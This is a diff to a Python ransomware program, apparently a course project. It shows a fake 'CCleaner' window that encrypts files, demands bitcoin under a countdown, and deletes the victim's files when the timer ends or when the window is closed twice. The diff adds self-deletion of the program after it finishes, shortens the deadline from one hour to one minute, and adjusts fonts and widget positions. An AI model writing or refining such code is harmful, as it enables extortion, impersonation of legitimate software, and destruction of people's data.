@@ -5,6 +5,10 @@ from tkinter import ttk
 from datetime import datetime
 from PIL import ImageTk, Image
 import random
+from tkinter import font
+from sys import argv
+import os
+from os import remove
 
 #Writes fernet key to text file on the desktop if user submits enough bitcoin
 def gui_write_key(key):
@@ -27,6 +31,9 @@ def gui_decrypt_files(file_paths, fernet, key):
         #Terminates program
         root.destroy()
 
+        #Self removes program off of computer
+        remove(argv[0])
+
 #Function to display message and prevent program from closing when user tries to exit out; gives warning on first close attempt, deletes all files in file_paths on second close attempt
 def on_close():
     global close_counter
@@ -36,7 +43,12 @@ def on_close():
     elif close_counter == 1:
         encrypter.delete_everything(file_paths)
         messagebox.showinfo(title = 'Files Deleted', message = 'You have been warned. Your files have now been permanently deleted. Have a nice day.')
+
+        #Terminates program
         root.destroy()
+
+        #Self removes program off of computer
+        remove(argv[0])
 
 
 # GUI Stuff / Main Program Loop ==========================================================================================================================================================
@@ -56,7 +68,7 @@ files_generated = False
 close_counter = 0
 
 #First Tab Widgets -----------------------------------------------------------------------------------------------------------------------------
-ccleaner_name = Label(root, text="CCleaner", font = ('Trebuchet MS', 100), fg = 'grey', bg = 'white')
+ccleaner_name = Label(root, text="CCleaner", font = ('Trebuchet', 100), fg = 'grey', bg = 'white')
 ccleaner_name.place(x = 500, y = 200)
 
 ccleaner_logo = ImageTk.PhotoImage(Image.open("CCleanerLogo.png"))
@@ -73,14 +85,14 @@ scanning_text.place(x = 505, y = 545)
 # ----------------------------------------------------------------------------------------------------------------------------------------------
 
 #Initializes 2nd tab widgets
-main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
+main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one minute.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
 bitcoin_entry = Entry(root, width = 30, borderwidth = 5)
-bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Times New Roman', 15), command=lambda:gui_write_key(key))
+bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Trebuchet', 15), command=lambda:gui_write_key(key))
 key_entry = Entry(root, width = 50, borderwidth = 5)
-key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: gui_decrypt_files(file_paths, crypter, key))
+key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Trebuchet', 18), command = lambda: gui_decrypt_files(file_paths, crypter, key))
 
 #Calls functions to create the file paths of all files to encrypt
-file_paths = encrypter.generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
+file_paths = encrypter.generate_file_list_keyword("C:\\Users\\bwiit\\Desktop\\CECS378Test")
 files_generated = True
 
 #Creates the Fernet object and the fernet encryption key
@@ -115,11 +127,16 @@ def tab2():
         if str(string) == '0:00:00' and global_status == 'Running':
             encrypter.delete_everything(file_paths)
             messagebox.showinfo(title = 'Files Deleted', message = 'The timer has reached zero, and we have not received any BitCoin from you. Your files have now been permanently deleted. Have a nice day.')
+
+            #Terminates program
             root.destroy()
+
+            #Self removes program off of computer
+            remove(argv[0])
             
     #Widget for creating the timer display
-    timer = Label(root, font=('Times New Roman', 70,'bold'), bg = 'red', fg = 'white')
-    timer.place(x = 494, y = 295)
+    timer = Label(root, font=('Trebuchet', 70,'bold'), bg = 'red', fg = 'white')
+    timer.place(x = 484, y = 295)
 
     #Function to initialize the timer
     update_time()
@@ -129,24 +146,24 @@ def tab2():
     main_text.place(x = 217, y = 190)
 
     #Widget for the entry box for input of the amount of bitcoin to send
-    bitcoin_entry.place(x = 465, y = 428)
+    bitcoin_entry.place(x = 468, y = 428)
     bitcoin_entry.insert(0, "Enter Amount of Bitcoin to Send")
     bitcoin_entry.bind("<FocusIn>", lambda event: bitcoin_entry.delete(0,"end") if bitcoin_entry.get() == "Enter Amount of Bitcoin to Send" else None)
     bitcoin_entry.bind("<FocusOut>", lambda event: bitcoin_entry.insert(0,"Enter Amount of Bitcoin to Send") if bitcoin_entry.get() == "" else None)
 
     #Widget for the button that is pressed after inputting bitcoin amount to entry.
     # Runs write_key() function if amount of bitcoin sent is greater than or equal to requested amount.
-    bitcoin_button.place(x = 685, y = 410)
+    bitcoin_button.place(x = 695, y = 410)
 
     #Widget for the entry box for input of the Fernet key to decrypt files.
-    key_entry.place(x = 481, y = 500)
+    key_entry.place(x = 490, y = 500)
     key_entry.insert(0, "Enter Key Here")
     key_entry.bind("<FocusIn>", lambda event: key_entry.delete(0,"end") if key_entry.get() == "Enter Key Here" else None)
     key_entry.bind("<FocusOut>", lambda event: key_entry.insert(0,"Enter Key Here") if key_entry.get() == "" else None)
 
     #Widget for the button that is pressed after inputting Fernet key.
     # Runs decrypt_files() function if Fernet key inputted matches the Fernet key generated at run time.
-    key_button.place(x = 546, y = 540)
+    key_button.place(x = 551, y = 540)
 
     #Labels for the skull images around the GUI
     image_label1 = Label(image = skull_image, bg = 'red')
